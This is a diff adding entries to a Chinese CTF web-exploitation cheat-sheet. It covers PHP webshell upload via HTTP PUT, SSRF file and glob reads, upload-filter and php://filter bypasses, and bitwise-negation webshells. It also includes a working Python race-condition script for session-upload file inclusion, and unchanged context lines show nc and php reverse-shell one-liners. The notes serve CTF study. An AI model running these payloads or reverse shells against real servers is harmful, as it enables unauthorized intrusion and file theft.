@@ -919,8 +919,9 @@ SELECT * FROM users WHERE username='vampire     ';
 - 看到 PHP 返回内容是 HTTP Headers，可以联想到 %00截断
 - 如果服务器开放了 HTTP PUT 方法，可以使用  `curl -X PUT -d '<?php eval(@$_POST['a']); ?>' http://x/b.php` 注入 `b.php` 文件（如果没有任何安全设置，**'PUT请求用于更新资源，如果资源不存在，可能会创建新的资源'** 这个原则会写入文件到服务端【真实场景几乎不会遇到此漏洞】）
 - GET 方法传参的代码审计题，如果 `system('ls')` 注入不了[可能被过滤了，或者题目只给了只读权限，蚁剑的连接不一定只靠 `system`]，可以试试 `eval($_POST["a"]);`，**善用蚁剑来连接**
+- 如果 `system` 命令执行了没反应，可能在 `phpinfo` 中被 `disable_functions` 绕过，可以取反访问下 `phpinfo`
 - SSRF
-  - 常用套路 file:///etc/password; file:///var/www/html/index.php ; file:///flag
+  - 常用套路 `file:///etc/password`; `file:///var/www/html/index.php` ; `file:///flag; glob:///*` 读取根目录下的所有文件; `glob:///fl*` 读取根目录下 fl* 开头的文件
   - 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 `http://127.0.0.1/flag.php`) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址（正则绕过：`localhost`、`0`、`127.0.0.x 、127.0.1、127.1`、`127.0.0。1`、`sudo.cc`）
   - 如果网站使用无密码 MySQL、Redis，可以考虑用 Gopherus 实现 RCE 注入
 
@@ -964,12 +965,25 @@ SELECT * FROM users WHERE username='vampire     ';
 
 ##### 上传
 - 拿到 webshell
+
 - 一般来说，题目可能过滤文件类型、文件后缀、文件头等
+
 - 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行（具体看题目怎么绕过的，实测 jpeg 最通用）。
+
 - 如果看不懂前端验证，可以改成图片格式后用 Burp 传上去，再用 Reapter 将文件后缀改为 PHP 传上去
+
 - 如果 [] 被过滤了，可以用 {} 替代？？
+
 - flag 不仅可以藏在文件中，还可以藏在环境变量中，在终端输入 `env` 查看环境变量
+
 - 如果 php 后缀被绕过，可以尝试 php3|php5|php7|phtml|pht (这些后缀可能被设置识别为 php)
+
+- 文件内容中，如果 `file` 被绕过，增加 `\` 并换行即可，如
+
+  ```
+  fil\
+  e_get_content
+  ```
 
 ###### test.php
 
@@ -1003,6 +1017,7 @@ SELECT * FROM users WHERE username='vampire     ';
 ###### .htaccess 防止绕过 php
 
 - 该方法旨在指定图片文件为可执行的 php 文件
+- `.htaccess` 还可以修改(覆盖) php 的默认配置
 
 如果服务端禁止上传 php，可以将 php 改为图片格式 (如 png) 欺骗服务器，再使用 .htaccess 将 png 指定为 php 文件执行。(需要注意下，传图片需要确保 HTTP Headers 的 content-type 为 image/jpeg，目前知道 .htaccess 支持 Nginx 和 Apache)
 
@@ -1115,13 +1130,27 @@ http://xxx/?p=php://filter/convert.base64-encode/resource=flag.php
 
 注释：使用 ?file=flag.php 读取文件可能会因为权限不足而无法读取到内容。因为有些 Web 服务器，如 Apache，会对目录或文件设置访问权限。如果当前用户没有足够的权限来读取 flag.php 文件，则无法读取到该文件的内容。而使用 ?file=php://filter/convert.base64-encode/resource=flag.php 可以绕过这些权限限制，因为 PHP 脚本本身具有读取文件的权限，它可以打开并读取任何一个它拥有的文件。通过将读取到的文件内容转换成 base64 编码后输出，即使该文件是二进制或包含特殊字符，也可以正确地输出文件内容，因此能够获取 flag。
 
-###### convert.iconv.utf8.utf16
+###### convert.iconv.utf8.utf16 及其他
 
 前一种方法不行的情况下，有时候该方法行得通
 
 ```
 php://filter/convert.iconv.utf8.utf16/resource=flag.php
 ```
+
+此外还有
+
+```
+php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
+```
+
+- 其中convert.iconv.utf-8.utf-7表示把内容由utf-8编码转到utf-7编码，其他的同理。具体还有哪些可以通过php官网
+
+```
+php://filter/read=string.rot13/resource=flag.php
+```
+
+- 该编码会自动进行 rot13 编码
 
 ###### text/plain
 
@@ -1284,6 +1313,8 @@ data={if system('ls')}{/if}
 
 #### 绕过复杂的正则表达式（RCE 类型之一）
 
+- 可以使用取反来构造一句话木马，详细见取反
+
 > 查看 flag.php 的一种冷门方法
 
 ```
@@ -1336,6 +1367,12 @@ print(r.text)
 ```
 
 ##### 取反
+
+- 一句话木马：由于 `eval` 不是 PHP 函数，取反构建一句话木马时必须使用 `assert`，如图:
+
+  ![image-20230905143440981](static/img/image-20230905143440981.png) 
+
+  构造出来的链接可能浏览器无法访问，但是未必蚁剑不能连接
 
 需要没过滤符号: `~`
 
@@ -2036,6 +2073,50 @@ PHP的会话管理通常使用文件或数据库存储会话数据。当用户�
 请注意，具体的攻击技术和防护措施可能因PHP版本、配置和应用程序实现的不同而有所差异。在实际开发和部署中，建议参考PHP官方文档和安全最佳实践来保护会话数据的安全性。
 
 **自己对上面解释的理解**：简单说，此处利用了 PHP Session 被开启上传的设置，让我们可以自己构造 Session 文件上传到服务端。PHP 检测 Session 的机制是定期轮询检测，我们利用的就是这个检测空档，通过增大我们上传的 session 文件的内容让文件上传时间更久（文件存活时间更久），确保我们自己上传的 session 不被立刻删除或清理。（如果只使用单线程，可能在网络 I/O 或其他等待时间文件就已经被删了）
+
+###### 另一个通用脚本
+
+- 只要是文件包含的题，几乎都可以用。只需要 改地址
+
+```python
+import requests
+import threading
+import sys
+session=requests.session()
+sess='yu22x'
+url1="http://3ba96309-5cba-4cc2-bf84-0b916069b4f4.node4.buuoj.cn:81/secr3t.php"
+url2='http://3ba96309-5cba-4cc2-bf84-0b916069b4f4.node4.buuoj.cn:81/secr3t.php?file=/tmp/sess_'+sess
+# 修改这里的执行命令即可
+data1={
+    'PHP_SESSION_UPLOAD_PROGRESS':'11122223333<?php system("ls /");?>'
+}
+
+file={
+    'file':'1'
+}
+cookies={
+    'PHPSESSID': sess
+}
+def write():
+    while True:
+        r = session.post(url1,data=data1,files=file,cookies=cookies)
+def read():
+    while True:
+        r = session.get(url2)
+        if('11122223333' in r.text):
+            print(r.text)
+
+if __name__=="__main__":
+    event=threading.Event()
+    with requests.session() as session:
+        for i in range(1,30): 
+            threading.Thread(target=write).start()
+        for i in range(1,30):
+            threading.Thread(target=read).start()
+    event.set()
+```
+
+
 
 #### 弱类型(==判断) 
 
@@ -3197,7 +3278,19 @@ mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
  php -r '$sock=fsockopen(ip,port);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
-## 常用软件的 RCE 漏洞
+## 常用软件的 RCE 漏洞 (围绕蚁剑)
+
+### 绕过 phpinfo 的 disable_functions
+
+当连接上蚁剑，且没有其他权限时，可以使用蚁剑来绕过 phpinfo 的 disable_functions，使用插件一个一个试，看哪个能访问
+
+![image-20230905143654352](static/img/image-20230905143654352.png)
+
+下面这个模式可能需要自己测试，并不知道哪种模式可以绕过
+
+![image-20230905143733580](static/img/image-20230905143733580.png)
+
+![image-20230905143807311](static/img/image-20230905143807311.png)
 
 ### Redis
 
